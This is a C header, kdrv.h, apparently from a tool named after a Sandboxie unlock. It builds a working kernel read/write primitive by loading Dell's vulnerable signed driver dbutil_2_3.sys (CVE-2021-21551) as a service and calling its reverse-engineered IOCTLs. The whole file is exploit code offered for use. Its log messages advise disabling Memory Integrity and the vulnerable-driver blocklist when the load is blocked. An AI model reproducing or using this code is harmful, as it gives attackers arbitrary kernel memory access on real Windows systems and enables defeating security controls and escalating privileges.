/*
 * kdrv.h - kernel R/W primitive via dbutil_2_3.sys (CVE-2021-21551)
 *
 * Loads the Dell-signed driver as a service and provides kernel memory
 * read/write through its IOCTLs.  Never stop/delete the service while
 * the driver is live (BSOD) - just close handles; stale services are
 * cleaned up on a later run after reboot.
 */
#ifndef KDRV_H
#define KDRV_H

#include <windows.h>
#include <winioctl.h>
#include "log.h"
#include "fileio.h"
#include "driver_bin.h"

/* Device name is hardcoded in the driver, independent of service name. */
#define KDRV_DEVICE   L"\\\\.\\DBUtil_2_3"

/* IOCTLs from reverse-engineering sub_11170 in dbutil_2_3.sys. */
#define KDRV_IOCTL_R  0x9B0C1EC4   /* memcpy read  (sub_15294, a2=0) */
#define KDRV_IOCTL_W  0x9B0C1EC8   /* memcpy write (sub_15294, a2=1) */
#define KDRV_HDR      24           /* 3 x uint64: cookie, base, offset */

typedef struct {
    SC_HANDLE hScm;
    SC_HANDLE hSvc;
    HANDLE    hDev;
    char      driverPath[MAX_PATH];  /* staging path (temp file) */
} kdrv_t;

/* Unique service name per process to avoid stale service conflicts. */
static char g_svc_name[64];

/* ------------------------------------------------------------------ */

/* Try to open the device if the driver is already running. */
static BOOL kdrv_try_open_device(kdrv_t *d)
{
    d->hDev = CreateFileW(KDRV_DEVICE, GENERIC_READ | GENERIC_WRITE,
                          0, NULL, OPEN_EXISTING, 0, NULL);
    if (d->hDev != INVALID_HANDLE_VALUE)
        return TRUE;
    d->hDev = NULL;
    return FALSE;
}

/* One raw IOCTL round-trip.  Returns 0, 1 (alloc), 2 (IOCTL failed),
 * 3 (short read response); *err_out gets the Win32 error captured
 * immediately after DeviceIoControl. */
static int kdrv_ioctl(kdrv_t *d, DWORD ctl, ULONG64 va,
                      const void *in_data, void *out_data, ULONG size,
                      ULONG *returned_out, DWORD *err_out)
{
    ULONG bufLen = KDRV_HDR + size;
    BYTE *buf = (BYTE *)HeapAlloc(GetProcessHeap(), 0, bufLen);
    if (!buf) return 1;

    *(ULONG64 *)(buf + 0)  = 0;   /* cookie = 0 (check skipped) */
    *(ULONG64 *)(buf + 8)  = va;
    *(ULONG64 *)(buf + 16) = 0;
    if (ctl == KDRV_IOCTL_W)
        memcpy(buf + KDRV_HDR, in_data, size);

    ULONG returned = 0;
    BOOL ok = DeviceIoControl(d->hDev, ctl, buf, bufLen,
                              buf, bufLen, &returned, NULL);
    if (returned_out) *returned_out = returned;

    if (!ok) {
        /* Capture the error right here - HeapFree below may clobber it */
        if (err_out) *err_out = GetLastError();
        HeapFree(GetProcessHeap(), 0, buf);
        return 2;
    }
    /* Write responses may be short; only reads require a full data block. */
    if (ctl == KDRV_IOCTL_R && returned < KDRV_HDR + size) {
        if (err_out) *err_out = ERROR_IO_INCOMPLETE;
        HeapFree(GetProcessHeap(), 0, buf);
        return 3;
    }
    if (ctl == KDRV_IOCTL_R)
        memcpy(out_data, buf + KDRV_HDR, size);
    HeapFree(GetProcessHeap(), 0, buf);
    return 0;
}

/* Close and reopen the device to clear stale state from a previous
 * driver instance.  Returns TRUE if the new handle is valid. */
static BOOL kdrv_reopen_device(kdrv_t *d)
{
    if (d->hDev) { CloseHandle(d->hDev); d->hDev = NULL; }
    return kdrv_try_open_device(d);
}

/* One read/write round-trip with one reopen-and-retry (the first request
 * through a stale device handle can be rejected). */
static int kdrv_xfer(kdrv_t *d, DWORD ctl, ULONG64 va,
                     const void *in_data, void *out_data, ULONG size)
{
    const char *what = (ctl == KDRV_IOCTL_R) ? "kdrv_read" : "kdrv_write";

    ULONG returned = 0;
    DWORD err = 0;
    int r = kdrv_ioctl(d, ctl, va, in_data, out_data, size, &returned, &err);
    if (r == 0) return 0;
    LOGE("%s failed: code=%d err=%lu (0x%lX) va=0x%llX size=%lu returned=%lu",
         what, r, err, err, va, size, returned);

    if (!kdrv_reopen_device(d)) {
        LOGE("%s: device reopen failed: %lu (0x%lX)",
             what, GetLastError(), GetLastError());
        return 2;
    }

    returned = 0;
    err = 0;
    r = kdrv_ioctl(d, ctl, va, in_data, out_data, size, &returned, &err);
    if (r == 0) {
        LOGW("%s recovered after device reopen", what);
        return 0;
    }
    LOGE("%s retry failed: code=%d err=%lu (0x%lX) returned=%lu",
         what, r, err, err, returned);
    return 2;
}

/* Read *size* bytes from kernel virtual address *va*. Returns 0 on success. */
static int kdrv_read(kdrv_t *d, ULONG64 va, void *out, ULONG size)
{
    return kdrv_xfer(d, KDRV_IOCTL_R, va, NULL, out, size);
}

/* Write *data* to kernel virtual address *va*. Returns 0 on success. */
static int kdrv_write(kdrv_t *d, ULONG64 va, const void *data, ULONG size)
{
    return kdrv_xfer(d, KDRV_IOCTL_W, va, data, NULL, size);
}

/* Delete a stale service if it's STOPPED. RUNNING services are left
 * alone (device is reused via fast path). */
static void kdrv_cleanup_stale(SC_HANDLE hScm)
{
    SC_HANDLE hOld = OpenServiceA(hScm, g_svc_name, SERVICE_ALL_ACCESS);
    if (!hOld) return;

    SERVICE_STATUS st;
    if (QueryServiceStatus(hOld, &st) && st.dwCurrentState == SERVICE_STOPPED) {
        DeleteService(hOld);
        Sleep(300);
    }
    CloseServiceHandle(hOld);
}

/* Delete the just-created service only if STOPPED (it never loaded);
 * a RUNNING service is left alone and reused via the fast path. */
static void kdrv_discard_service(kdrv_t *d)
{
    if (d->hSvc) {
        SERVICE_STATUS st;
        if (QueryServiceStatus(d->hSvc, &st) && st.dwCurrentState == SERVICE_STOPPED)
            DeleteService(d->hSvc);
        CloseServiceHandle(d->hSvc);
        d->hSvc = NULL;
    }
    if (d->hScm) {
        CloseServiceHandle(d->hScm);
        d->hScm = NULL;
    }
}

/* Verify that the file at path contains exactly the embedded driver bytes.
 * Called right before CreateService to close the swap race on
 * user-writable staging paths. */
static BOOL kdrv_verify_driver_file(const char *path)
{
    BYTE *buf = NULL;
    DWORD size = 0;
    if (!read_file_all(path, &buf, &size, g_driver_size)) {
        LOGW("Verify driver file: read failed: %s", path);
        return FALSE;
    }
    if (size != g_driver_size) {
        LOGW("Verify driver file: size %lu != expected %lu", size, g_driver_size);
        HeapFree(GetProcessHeap(), 0, buf);
        return FALSE;
    }
    BOOL ok = (memcmp(buf, g_driver_bin, size) == 0);
    HeapFree(GetProcessHeap(), 0, buf);
    return ok;
}

/* Load the driver: opens device if already running, otherwise creates
 * a service and starts it.  The driver file must already exist at the
 * staging path produced by extract_driver.  Returns 0 on success. */
static int kdrv_load(kdrv_t *d, const char *driver_path)
{
    memset(d, 0, sizeof(*d));

    /* Fast path: device already exists from a prior run */
    if (kdrv_try_open_device(d)) {
        LOGI("kdrv_load: fast path - existing DBUtil_2_3 device reused");
        return 0;
    }

    /* Unique service name per process */
    wsprintfA(g_svc_name, "sbie_unlock_%lu", GetCurrentProcessId());

    /* Driver path comes from extract_driver (temp staging) */
    if (!driver_path || !driver_path[0]) {
        LOGE("No driver path supplied - extract_driver must run first");
        return 1;
    }
    LOGI("kdrv_load: fresh service load, name=%s path=%s", g_svc_name, driver_path);
    strcpy_s(d->driverPath, MAX_PATH, driver_path);

    if (GetFileAttributesA(d->driverPath) == INVALID_FILE_ATTRIBUTES) {
        LOGE("Driver file not found: %s", d->driverPath);
        return 1;
    }

    /* Verify the file on disk exactly matches the embedded driver right
     * before loading - closes the swap race on writable staging paths */
    if (!kdrv_verify_driver_file(d->driverPath)) {
        LOGE("Driver file content verification failed: %s", d->driverPath);
        return 6;
    }

    d->hScm = OpenSCManagerA(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
    if (!d->hScm) {
        LOGE("OpenSCManager failed: %lu", GetLastError());
        return 2;
    }

    kdrv_cleanup_stale(d->hScm);

    d->hSvc = CreateServiceA(d->hScm, g_svc_name, g_svc_name,
                             SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                             SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                             d->driverPath, NULL, NULL, NULL, NULL, NULL);
    if (!d->hSvc) {
        DWORD err = GetLastError();
        LOGE("CreateService failed: %lu", err);
        if (err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            Sleep(1000);
            d->hSvc = CreateServiceA(d->hScm, g_svc_name, g_svc_name,
                                     SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                                     SERVICE_DEMAND_START, SERVICE_ERROR_NORMAL,
                                     d->driverPath, NULL, NULL, NULL, NULL, NULL);
        } else if (err == ERROR_SERVICE_EXISTS) {
            /* Same-PID leftover that cleanup could not delete (e.g. a
             * RUNNING driver under a recycled pid name) - adopt it and
             * repoint it at our verified staging file, so a stale
             * ImagePath cannot break StartService. */
            d->hSvc = OpenServiceA(d->hScm, g_svc_name, SERVICE_ALL_ACCESS);
            if (d->hSvc &&
                !ChangeServiceConfigA(d->hSvc, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE,
                                      SERVICE_NO_CHANGE, d->driverPath, NULL, NULL,
                                      NULL, NULL, NULL, NULL)) {
                LOGW("ChangeServiceConfig on adopted service failed: %lu", GetLastError());
            }
        }
        if (!d->hSvc) {
            CloseServiceHandle(d->hScm);
            d->hScm = NULL;
            return 3;
        }
    }

    if (!StartServiceA(d->hSvc, 0, NULL)) {
        DWORD err = GetLastError();
        LOGE("StartService failed: 0x%lX (%lu) svc=%s", err, err, g_svc_name);
        if (err == 0x800B010C || err == ERROR_INVALID_IMAGE_HASH ||
            err == ERROR_DRIVER_BLOCKED) {
            LOGW("Blocked by code integrity: vulnerable driver blocklist or HVCI -");
            LOGW("run unlock.bat option [4] / disable Memory Integrity, reboot, retry.");
        }
        if (err == ERROR_ALREADY_EXISTS || err == ERROR_SERVICE_MARKED_FOR_DELETE) {
            if (kdrv_try_open_device(d)) { LOGI("kdrv_load: device reuse after StartService error"); return 0; }
            Sleep(2000);
            if (kdrv_try_open_device(d)) { LOGI("kdrv_load: device reuse after StartService error (retry)"); return 0; }
            LOGW("kdrv_load: device is not accessible after StartService error 0x%lX - giving up", err);
        }
        if (err != ERROR_SERVICE_ALREADY_RUNNING) {
            kdrv_discard_service(d);
            return 4;
        }
    }

    LOGI("kdrv_load: service started, waiting for device");
    /* Wait for device to appear */
    for (int i = 0; i < 20; i++) {
        if (kdrv_try_open_device(d))
            return 0;
        Sleep(100);
    }
    kdrv_discard_service(d);
    return 5;
}

/* Unload: close handles only. Never stop/delete while live (BSOD risk). */
static void kdrv_unload(kdrv_t *d)
{
    if (d->hDev) { CloseHandle(d->hDev); d->hDev = NULL; }
    if (d->hSvc) { CloseServiceHandle(d->hSvc); d->hSvc = NULL; }
    if (d->hScm) { CloseServiceHandle(d->hScm); d->hScm = NULL; }
    /* Temp file cleanup is handled by cleanup_stale_temp_drivers on the
     * next run (the mapped image locks the file until reboot). */
}

#endif /* KDRV_H */
